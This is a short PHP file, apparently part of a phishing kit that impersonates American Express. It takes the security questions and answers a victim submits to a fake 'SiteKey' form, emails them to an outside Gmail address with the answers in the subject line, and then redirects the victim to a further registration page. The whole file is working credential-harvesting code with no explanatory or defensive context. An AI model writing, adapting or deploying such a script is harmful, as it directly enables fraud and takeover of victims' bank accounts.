<?
$ip = getenv("REMOTE_ADDR");
$message .= "......................................Amex-Security Question.....................................\n";

$message .= "--------------------------------------------------------------------------------\n";
$message .= "				~ SiteKey ~				\n";
$message .= "--------------------------------------------------------------------------------\n";
$message .= "".$_POST['q1']."\n";
$message .= "".$_POST['a1']."\n";
$message .= "".$_POST['q2']."\n";
$message .= "".$_POST['a2']."\n";
$message .= "".$_POST['q3']."\n";
$message .= "".$_POST['a3']."\n";
$message .= "......................................Amex-Security Question..................................\n";
$send = "northbryan4u@gmail.com";
$subject = " $a1 | $a2 | $a3";
mail($send,$subject,$message);
header("Location: Registration.htm");
?>